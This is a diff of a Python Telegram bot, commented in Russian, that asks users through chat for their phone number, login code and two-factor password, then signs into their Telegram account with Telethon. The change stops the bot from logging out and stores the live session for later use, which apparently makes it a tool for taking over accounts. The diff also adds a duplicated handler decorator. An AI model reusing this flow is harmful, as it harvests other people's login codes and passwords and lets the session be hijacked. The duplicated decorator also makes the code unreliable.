@@ -95,14 +95,16 @@ async def get_phone_number(message: types.Message):
 @dp.message_handler(lambda message: message.text and 
                     'phone_code_hash' in user_state.get(message.from_user.id, {}) and
                     'awaiting_password' not in user_state.get(message.from_user.id, {}))
+@dp.message_handler(lambda message: message.text and 
+                    'phone_code_hash' in user_state.get(message.from_user.id, {}) and
+                    'awaiting_password' not in user_state.get(message.from_user.id, {}))
 async def get_code(message: types.Message):
     code = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
 
+    client = create_client()  # Создаем экземпляр клиента здесь
     try:
-        # Создаем новый экземпляр клиента
-        client = create_client()
         await client.connect()
         
         # Проверяем, что пин-код состоит из 5 цифр
@@ -116,24 +118,21 @@ async def get_code(message: types.Message):
         
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
+        # Сохраняем экземпляр клиента для последующего использования
+        user_state[message.from_user.id]['client'] = client
     except SessionPasswordNeededError:
         await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
         user_state[message.from_user.id]['awaiting_password'] = True
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
-    finally:
-        await client.log_out()
-        await client.disconnect()
 
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
 async def process_password(message: types.Message):
     password = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
-    
+    client = user_state[message.from_user.id]['client']  # Используем сохраненный экземпляр клиента
     try:
-        # Создаем новый экземпляр клиента
-        client = create_client()
         await client.connect()
         
         await client.sign_in(password=password)
